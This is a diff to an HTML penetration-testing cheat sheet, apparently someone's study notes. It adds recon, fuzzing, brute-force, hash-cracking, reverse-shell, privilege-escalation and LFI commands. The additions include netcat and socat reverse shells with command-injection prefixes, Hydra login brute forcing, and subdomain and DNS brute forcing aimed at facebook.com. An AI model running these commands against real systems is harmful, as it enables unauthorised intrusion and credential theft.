@@ -192,7 +192,7 @@ network interface and/or configure network interface parameters.</td>
 </tr>
 <tr class="odd">
 <td><code>ip</code></td>
-<td>Ip is a utility to show or manipulate routing, network devices,
+<td>IP is a utility to show or manipulate routing, network devices,
 interfaces and tunnels.</td>
 </tr>
 <tr class="even">
@@ -799,7 +799,8 @@ websites, collected automatically via its web crawlers.</p>
 <h4 id="project-sonar"><span class="header-section-number">1.5.1.2</span> Project Sonar</h4>
 <p>To find all available subdomains we can use
 <code>Project Sonar</code>:</p>
-<pre class="shell"><code>$ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r &#39;.[]&#39; | sort -u</code></pre>
+<pre class="shell"><code>$ export TARGET=&quot;facebook.com&quot;
+$ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r &#39;.[]&#39; | sort -u</code></pre>
 <h4 id="certificates"><span class="header-section-number">1.5.1.3</span>
 Certificates</h4>
 <p>To gain more information we can search for certificates at sites like
@@ -837,73 +838,160 @@ websites.</p>
 <pre class="shell"><code>$ whatweb -a 1 https://www.facebook.com -v</code></pre>
 <pre><code>*(-a    = Set the aggression level. 1(low) - 4(high) 
   -v    = verbose)</code></pre>
-<!-- USE wafwoof to detect the CMS!!! -->
+<h4 id="active-subdomain-enumeration-zone-transfer"><span class="header-section-number">1.5.2.3</span> Active Subdomain
+Enumeration (Zone transfer)</h4>
+<ol style="list-style-type: decimal">
+<li><p>Identifying Nameservers:
+<code>shell     nslookup -type=NS &lt;target&gt;</code></p></li>
+<li><p>Testing for <code>ANY</code> and <code>AXFR</code> Zone Transfer:
+<code>shell     nslookup -type=any -query=AXFR &lt;target&gt; &lt;nameserver&gt;</code></p></li>
+</ol>
+<h4 id="gobuster---dns"><span class="header-section-number">1.5.2.4</span> Gobuster - DNS</h4>
+<p>First we need to create our pattern file, which is described in
+Project Sonar section. Now we can export the parameters and run the
+<code>gobuster</code> command.</p>
+<pre class="shell"><code>$ export TARGET=&quot;facebook.com&quot;
+$ export NS=&quot;d.ns.facebook.com&quot;
+$ export WORDLIST=&quot;numbers.txt&quot;
+$ gobuster dns -q -r &quot;${NS}&quot; -d &quot;${TARGET}&quot; -w &quot;${WORDLIST}&quot; -p ./patterns.txt -o &quot;gobuster_${TARGET}.txt&quot;</code></pre>
+<pre class="text"><code>*(-q   = Don&#39;t print the banner and other noise
+  -r   = Use custom DNS server
+  -d   = A target domain name
+  -p   = Path to the patterns file
+  -w   = Path to the wordlist
+  -o   = Output file)</code></pre>
 </div>
 
-<div id="exploiting-network-services" class="title-slide slide section level2" number="1.6">
-<h1><span class="header-section-number">1.6</span> Exploiting Network
+<div id="ffuf" class="title-slide slide section level2" number="1.6">
+<h1><span class="header-section-number">1.6</span> ffuf</h1>
+<p><code>ffuf</code> is a fest web fuzzer written in Go that allows
+typical directory discovery, virtual host discovery (without DNS
+records) and GET and POST parameter fuzzing.</p>
+</div>
+<div id="performance" class="slide section level3" number="1.6.1">
+<h1><span class="header-section-number">1.6.1</span> Performance</h1>
+<p>To increase the speed of <code>ffuf</code> we can increase the number
+of threads with the <code>-t</code> flag, but it is important that we
+don’t give <code>ffuf</code> too much power because it could lead in a
+<code>DoS</code>.</p>
+<pre class="shell"><code>$ ffuf -w &lt;SNIP&gt; -u &lt;SNIP&gt; -t 200</code></pre>
+</div>
+<div id="directory-fuzzing" class="slide section level3" number="1.6.2">
+<h1><span class="header-section-number">1.6.2</span> Directory
+Fuzzing</h1>
+<p>With the <code>-w</code> flag we can pass our wordlist, with
+<code>-u</code> the URL we want to fuzz. To tell <code>ffuf</code> where
+we want to fuzz, we need to place the <code>FUZZ</code> keyword this can
+look like the following command:</p>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></pre>
+</div>
+<div id="page-fuzzing" class="slide section level3" number="1.6.3">
+<h1><span class="header-section-number">1.6.3</span> Page Fuzzing</h1>
+<p>If we want, we can combine two keywords in one search. For that we
+can use <code>FUZZ_1.FUZZ_2</code>. #### Extension Fuzzing</p>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ</code></pre>
+<h4 id="page-fuzzing-1"><span class="header-section-number">1.6.3.1</span> Page Fuzzing</h4>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></pre>
+</div>
+<div id="recursive-fuzzing" class="slide section level3" number="1.6.4">
+<h1><span class="header-section-number">1.6.4</span> Recursive
+Fuzzing</h1>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></pre>
+<pre class="text"><code>*(-recursion              = scans the directory recursive
+  -recursion-depth 1      = only fuzz the current directory and their direct sub-directories
+  -e .php                 = specify the extension
+  -v                      = output the full URLs)</code></pre>
+</div>
+<div id="subdomain-fuzzing" class="slide section level3" number="1.6.5">
+<h1><span class="header-section-number">1.6.5</span> Subdomain
+Fuzzing</h1>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/</code></pre>
+</div>
+<div id="vhost-fuzzing" class="slide section level3" number="1.6.6">
+<h1><span class="header-section-number">1.6.6</span> Vhost Fuzzing</h1>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H &#39;Host: FUZZ.example.com&#39; -fs xxx</code></pre>
+<pre><code>*(-H &#39;Host: FUZZ.example.com&#39; = Header `&quot;Name: Value&quot;`, separated by colon.
+  -fs xxx                     = filter all incorrect results)</code></pre>
+</div>
+<div id="parameter-fuzzing" class="slide section level3" number="1.6.7">
+<h1><span class="header-section-number">1.6.7</span> Parameter
+Fuzzing</h1>
+<h4 id="get-request"><span class="header-section-number">1.6.7.1</span>
+GET Request</h4>
+<pre class="shell"><code>$ ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code></pre>
+<h4 id="post-request"><span class="header-section-number">1.6.7.2</span>
+POST Request</h4>
+<pre class="shell"><code>$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></pre>
+</div>
+
+<div id="exploiting-network-services" class="title-slide slide section level2" number="1.7">
+<h1><span class="header-section-number">1.7</span> Exploiting Network
 Services</h1>
 
 </div>
-<div id="github-repos" class="slide section level3" number="1.6.1">
-<h1><span class="header-section-number">1.6.1</span> GitHub Repos</h1>
-<p>[SecLists] (https://github.com/danielmiessler/SecLists)</p>
+<div id="github-repos" class="slide section level3" number="1.7.1">
+<h1><span class="header-section-number">1.7.1</span> GitHub Repos</h1>
+<p>[SecLists] (https://github.com/danielmiessler/SecLists) <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></p>
 </div>
-<div id="ssh" class="slide section level3" number="1.6.2">
-<h1><span class="header-section-number">1.6.2</span> SSH</h1>
+<div id="ssh" class="slide section level3" number="1.7.2">
+<h1><span class="header-section-number">1.7.2</span> SSH</h1>
 <p>Authenticate via ssh with the key-file <code>id_rsa</code>:</p>
-<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ssh <span class="at">-i</span> id_rsa user@10.10.10.10</span></code></pre></div>
+<div class="sourceCode" id="cb46"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ssh <span class="at">-i</span> id_rsa user@10.10.10.10</span></code></pre></div>
 <pre class="text"><code>*(-i [file]  = Identity file)</code></pre>
 </div>
-<div id="nmap" class="slide section level3" number="1.6.3">
-<h1><span class="header-section-number">1.6.3</span> NMAP</h1>
+<div id="nmap" class="slide section level3" number="1.7.3">
+<h1><span class="header-section-number">1.7.3</span> NMAP</h1>
 <p>Checks open ports in defined range and check running services with
 <code>Nmap</code>:</p>
-<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap 10.10.221.8 <span class="at">-sV</span> <span class="at">-p</span> 0-60000</span></code></pre></div>
+<div class="sourceCode" id="cb48"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap 10.10.221.8 <span class="at">-sV</span> <span class="at">-p-</span> <span class="at">-v</span></span></code></pre></div>
 <pre class="text"><code>*(-p-  = Scans the whole portrange
+  -v   = verbose
   -p   = Specific port or portrange
   -sV  = Attempts to determine the version of the service running on port
   -A   = Enables OS detection, version detection, script scanning and traceroute)</code></pre>
 </div>
-<div id="ftp" class="slide section level3" number="1.6.4">
-<h1><span class="header-section-number">1.6.4</span> FTP</h1>
+<div id="ftp" class="slide section level3" number="1.7.4">
+<h1><span class="header-section-number">1.7.4</span> FTP</h1>
 <p>Download a File from an FTP-Server with <code>Wget</code>:</p>
-<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> wget <span class="at">-m</span> ftp://user:password@ftp.example.com</span></code></pre></div>
+<div class="sourceCode" id="cb50"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> wget <span class="at">-m</span> ftp://user:password@ftp.example.com</span></code></pre></div>
 <pre class="text"><code>*(-m = --mirror)</code></pre>
-<h4 id="hydra"><span class="header-section-number">1.6.4.1</span>
+<h4 id="hydra"><span class="header-section-number">1.7.4.1</span>
 Hydra</h4>
 <p>Use <code>Hydra</code> for cracking password in our example on an
 FTP-Service:</p>
-<div class="sourceCode" id="cb39"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> hydra <span class="at">-t</span> 4 <span class="at">-l</span> dale <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.10.6 ftp</span></code></pre></div>
+<div class="sourceCode" id="cb52"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> hydra <span class="at">-t</span> 4 <span class="at">-l</span> dale <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.10.6 ftp</span></code></pre></div>
 <pre class="text"><code>*(-t 4      = Number of parallel connections per target
   -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
   -P [file] = Points to the file containing the list of possible passwords
   -vV       = Very verbose: shows the login+pass combination for each attempt
   [IP]      = The IP address of the target machine
   [ftp]     = Sets the protocol)</code></pre>
+<p>On PHP</p>
+<pre class="shell"><code>hydra -l admin -P /usr/shared/rockyou.txt &lt;ip&gt; http-post-form &quot;/login.php?username=^USER^&amp;password=^PASS^:F=Invalid Username or Password&quot;</code></pre>
+<pre class="shell"><code>hydra http-post-form -U # For help</code></pre>
 </div>
-<div id="nfs" class="slide section level3" number="1.6.5">
-<h1><span class="header-section-number">1.6.5</span> NFS</h1>
+<div id="nfs" class="slide section level3" number="1.7.5">
+<h1><span class="header-section-number">1.7.5</span> NFS</h1>
 <p>List name or <code>NFS</code> shares:</p>
-<div class="sourceCode" id="cb41"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> /usr/sbin/showmount <span class="at">-e</span> [IP]</span></code></pre></div>
+<div class="sourceCode" id="cb56"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb56-1"><a href="#cb56-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> /usr/sbin/showmount <span class="at">-e</span> [IP]</span></code></pre></div>
 <pre class="text"><code>*(-e    = Shows the NSF server&#39;s export list
   [IP]  = The IP Address of the NFS server)</code></pre>
 <p>Connect <code>NFS</code> share with mount point on our machine:</p>
-<div class="sourceCode" id="cb43"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo mount <span class="at">-t</span> nfs IP:share /tmp/mount/ <span class="at">-nolock</span></span></code></pre></div>
+<div class="sourceCode" id="cb58"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb58-1"><a href="#cb58-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo mount <span class="at">-t</span> nfs IP:share /tmp/mount/ <span class="at">-nolock</span></span></code></pre></div>
 <pre class="text"><code>*(-t nfs    = Type of device to mount, then specifying that it&#39;s NFS
   IP:share  = The IP Address of the NFS server, and the name of the share we wish to mount
   -nolock   = Specifies not to use NLM locking)</code></pre>
 </div>
-<div id="smtp" class="slide section level3" number="1.6.6">
-<h1><span class="header-section-number">1.6.6</span> SMTP</h1>
+<div id="smtp" class="slide section level3" number="1.7.6">
+<h1><span class="header-section-number">1.7.6</span> SMTP</h1>
 <p>There are three relevant commands, when it comes to
 <code>SMTP</code>:</p>
 <pre class="text"><code>(VRFY    = Confirming the names of valid users
  EXPN    = Reveals the actual address of user’s aliases and lists of e-mail (mailing lists)
  RCPT TO = Specifies the e-mail address of the recipient)</code></pre>
 </div>
-<div id="metasploit" class="slide section level3" number="1.6.7">
-<h1><span class="header-section-number">1.6.7</span> Metasploit</h1>
+<div id="metasploit" class="slide section level3" number="1.7.7">
+<h1><span class="header-section-number">1.7.7</span> Metasploit</h1>
 <pre class="text"><code>*(search [name]                 = Search for a module and his description
   use [name]                    = Selects a module by name
   options                       = When a module is selected we will see the options of the module
@@ -911,14 +999,19 @@ FTP-Service:</p>
   run                           = Run the exploit)</code></pre>
 <p>For further information see the following documentation: <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/">offensive-security.com</a></p>
 </div>
-<div id="mysql" class="slide section level3" number="1.6.8">
-<h1><span class="header-section-number">1.6.8</span> MySQL</h1>
+<div id="mysql" class="slide section level3" number="1.7.8">
+<h1><span class="header-section-number">1.7.8</span> MySQL</h1>
 <p>First we need a client, which is in our case
 <code>default-mysql-client</code>:</p>
-<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
+<div class="sourceCode" id="cb62"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb62-1"><a href="#cb62-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
 <pre class="text"><code>*(-h [IP]        = Connect to the MariaDB server on the given host
   -u [username]  = The MariaDB user name to use when connecting to the server
   -p             = The password to use when connecting to the server)</code></pre>
+<ol style="list-style-type: decimal">
+<li><code>use &lt;database&gt;;</code></li>
+<li><code>show tables;</code></li>
+<li><code>select * from &lt;tablename&gt;;</code></li>
+</ol>
 <p>If we do not have any credentials we can use <code>Nmap</code> or
 <code>Metasplot</code> to gain this information:</p>
 <pre class="nmap```"><code>```bash
@@ -927,7 +1020,7 @@ $ nmap --script=mysql-enum [target]</code></pre>
   [target]                      = The IP address of the target)</code></pre>
 <p>Now that we know some usernames of the database, we can try to crack
 the passwords of them with <code>Hydra</code>:</p>
-<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
+<div class="sourceCode" id="cb66"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
 <pre class="text"><code>*(-t 16     = Number of parallel connections per target
   -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
   -P [file] = Points to the file containing the list of possible passwords
@@ -935,30 +1028,34 @@ the passwords of them with <code>Hydra</code>:</p>
   [IP]      = The IP address of the target machine
   [mysql]   = Sets the protocol)</code></pre>
 </div>
-<div id="john-the-ripper" class="slide section level3" number="1.6.9">
-<h1><span class="header-section-number">1.6.9</span> John the
+<div id="john-the-ripper" class="slide section level3" number="1.7.9">
+<h1><span class="header-section-number">1.7.9</span> John the
 Ripper</h1>
 <p>If we have a hash which look something like the following
 example:</p>
 <pre><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
 <p>We can pipe the hash in a file:</p>
-<div class="sourceCode" id="cb54"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb69"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb69-1"><a href="#cb69-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
 <p>And crack the password with <code>John the Ripper</code>:</p>
-<div class="sourceCode" id="cb55"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
-<span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
+<div class="sourceCode" id="cb70"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb70-1"><a href="#cb70-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
+<span id="cb70-2"><a href="#cb70-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
 <pre class="text"><code>*(--show            = show cracked passwords
   --format=&lt;param&gt;  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt</code></pre>
 </div>
+<div id="hashcat" class="slide section level3" number="1.7.10">
+<h1><span class="header-section-number">1.7.10</span> Hashcat</h1>
+<pre class="shell"><code>$ hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></pre>
+</div>
 
-<div id="web-fundamentals" class="title-slide slide section level2" number="1.7">
-<h1><span class="header-section-number">1.7</span> Web Fundamentals</h1>
+<div id="web-fundamentals" class="title-slide slide section level2" number="1.8">
+<h1><span class="header-section-number">1.8</span> Web Fundamentals</h1>
 
 </div>
-<div id="curl" class="slide section level3" number="1.7.1">
-<h1><span class="header-section-number">1.7.1</span> Curl</h1>
+<div id="curl" class="slide section level3" number="1.8.1">
+<h1><span class="header-section-number">1.8.1</span> Curl</h1>
 <p>If we want to get sources of a webpage, we can do this with
 <code>Curl</code>:</p>
-<div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-X</span> GET http://10.10.4.59:8081/ctf/post</span></code></pre></div>
+<div class="sourceCode" id="cb73"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb73-1"><a href="#cb73-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-X</span> GET http://10.10.4.59:8081/ctf/post</span></code></pre></div>
 <pre class="text"><code>*(-X [GET]          = Set kind of fetch
   [target]          = The URL of the webpage we want to fetch
   -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)</code></pre>
@@ -969,9 +1066,26 @@ directories and files as well as DNS subdomains.</p>
 <p><code>DIRB</code> is a Web Content Scanner. It looks for existing
 (and/or hidden) Web Objects.</p>
 </div>
-<div id="reverse-shell" class="slide section level3" number="1.7.2">
-<h1><span class="header-section-number">1.7.2</span> Reverse Shell</h1>
-<pre class="shell"><code>$ ;nc -e /bin/bash</code></pre>
+<div id="reverse-shell" class="slide section level3" number="1.8.2">
+<h1><span class="header-section-number">1.8.2</span> Reverse Shell</h1>
+<h4 id="netcat"><span class="header-section-number">1.8.2.1</span>
+Netcat</h4>
+<p>Listener:</p>
+<pre class="shell"><code>$ nc -lvnp 4242</code></pre>
+<p>Victim:</p>
+<pre class="shell"><code>$ ;nc -e /bin/sh 10.0.0.1 4242</code></pre>
+<h4 id="socat"><span class="header-section-number">1.8.2.2</span>
+Socat</h4>
+<p>Lister:</p>
+<pre class="shell"><code>$ socat -d -d TCP4-LISTEN:4443 STDOUT</code></pre>
+<p>Victim (Linux):</p>
+<pre class="shell"><code>$ ;socat TCP4:10.0.0.1:4443 EXEC:/bin/bash</code></pre>
+<p>Victim (Windows):</p>
+<pre class="shell"><code>$ ;socat TCP4:192.168.168.1:4443 EXEC:&#39;cmd.exe&#39;,pipes</code></pre>
+<h4 id="stabilize-shell"><span class="header-section-number">1.8.2.3</span> Stabilize Shell</h4>
+<p>You can stabilize the shell with the python module
+<code>pty</code>:</p>
+<div class="sourceCode" id="cb80"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb80-1"><a href="#cb80-1" aria-hidden="true" tabindex="-1"></a>python <span class="op">-</span>c <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span></code></pre></div>
 <p>For more information checkout the following GitHub repo: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a></p>
 <p>If you gain access depending on the OS you can try the following
 commands to get more information: &gt;Linux</p>
@@ -991,6 +1105,18 @@ commands to get more information: &gt;Linux</p>
   $ ipconfig
   $ tasklist
   $ netstat -an</code></pre>
+</div>
+<div id="privilege-escalation" class="slide section level3" number="1.8.3">
+<h1><span class="header-section-number">1.8.3</span> Privilege
+Escalation</h1>
+<h4 id="exploiting-suid"><span class="header-section-number">1.8.3.1</span> Exploiting SUID</h4>
+<pre class="shell"><code>find / -perm /4000 2&gt;/dev/null</code></pre>
+<pre class="shell"><code>sudo chmod +s bash</code></pre>
+</div>
+
+<div id="lfi" class="title-slide slide section level2" number="1.9">
+<h1><span class="header-section-number">1.9</span> LFI</h1>
+<pre><code>entry=php://filter/convert.base64-encode/resource=index.php</code></pre>
 </div>
 
 </body>
